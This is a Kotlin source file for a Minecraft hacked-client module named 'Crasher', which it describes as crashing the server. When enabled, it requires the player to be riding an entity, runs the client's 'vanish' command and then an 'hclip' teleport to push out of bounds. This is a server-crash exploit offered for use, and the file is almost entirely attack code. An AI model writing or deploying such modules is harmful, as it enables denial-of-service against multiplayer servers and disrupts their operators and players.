package com.defrag.client.module.modules.extra

import com.defrag.client.command.CommandManager
import com.defrag.client.module.Category
import com.defrag.client.module.Module
import com.defrag.client.util.text.MessageSendHelper

object Crasher : Module(
    name = "Crasher",
    category = Category.MISC,
    description = "Crashes the server if used correctly"
) {

    private val mode by setting("Mode", Mode.GOD_MODE_OUT_OF_BOUNDS)
    private val tpDistance by setting("TPDist", 1, 1..1024, 1)

    init {
        onEnable {

            MessageSendHelper.sendWarningMessage("You need to have a tunnel to the render distance infront of you for this to work (i think?)!")
            if (mc.player.ridingEntity == null) {
                MessageSendHelper.sendWarningMessage("You need to be riding a horse for this to work. Disabling.")
                disable()
                return@onEnable
            }

            CommandManager.runCommand("vanish")
            MessageSendHelper.sendChatMessage("Vanished")

            MessageSendHelper.sendChatMessage("Teleporting")
            CommandManager.runCommand("hclip $tpDistance")

        }
    }

    private enum class Mode {
        GOD_MODE_OUT_OF_BOUNDS
    }
}